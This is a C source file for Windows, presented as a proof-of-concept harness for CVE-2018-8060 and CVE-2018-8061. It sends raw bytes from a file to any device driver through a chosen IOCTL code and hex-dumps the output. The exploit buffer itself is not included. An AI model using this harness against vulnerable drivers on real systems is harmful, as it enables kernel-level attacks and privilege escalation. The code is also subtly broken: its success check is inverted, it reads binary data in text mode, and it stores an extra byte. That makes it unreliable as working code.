#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* This is a generic IOCTL "dispatcher". I made this to be used as a POC for CVE 2018-8060 and 2018-8061.
   It can be used to any device, IOCTL and data, thought.
   Input data is a binary file, containing raw data to be used as input buffer in IO control.
   Output data is displayed as hexdecimal dump.
*/


#define MAX_BUFSIZE 4096

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int main(int argc, char ** argv)
{
    HANDLE deviceHandle;
    FILE *fileHandle;
    char byte;
    char bufInput[MAX_BUFSIZE] , bufOutput[MAX_BUFSIZE];
    char   deviceName[64] = "\\\\.\\";
    int cnt=0,nbytes=0, status;
    unsigned long int currentIoctl;

    if(argc<4)
    {
       printf("[*] Use: %s [device name] [IOCTL(hex)] [input data file name]\n",argv[0]);
       exit(1);
    }
    currentIoctl=  (unsigned long int)strtoll(argv[2], NULL, 16);
    strncat(deviceName,  argv[1],strlen( argv[1]));
    printf("[*] Open handle to the device %s ... \n", deviceName);
    deviceHandle = CreateFile((HANDLE)deviceName,
                              GENERIC_READ | GENERIC_WRITE,
                              0,
                              NULL,
                              OPEN_EXISTING,
                              0,
                              NULL);

    fileHandle =fopen(argv[3],"r");

    if(deviceHandle == INVALID_HANDLE_VALUE || !fileHandle)
    {
        printf("[-] Failed opening handle, error code: %lu\n", GetLastError());
        exit(1);
    }

    while(!feof(fileHandle))
    {
        if(cnt==MAX_BUFSIZE)
        {
            printf("[-] Max buffer size reached, increase it or reduce input data!\n");
            exit(1);
        }

        fread(&byte, 1, 1, fileHandle);
        bufInput[cnt++]=byte;
    }
    //printf("%x | %d.\n",currentIoctl,cnt);
    status = DeviceIoControl(deviceHandle,
                             currentIoctl,
                             &bufInput,
                             cnt,
                             &bufOutput,
                             MAX_BUFSIZE,
                             (LPDWORD)&nbytes,
                             NULL);
    if(status != 0)
        printf("[-] Failed IO control, error code: %lu\n", GetLastError());

    printf("[+] Output data:\n");
    DumpHex(bufOutput,nbytes);
    return 0;
}
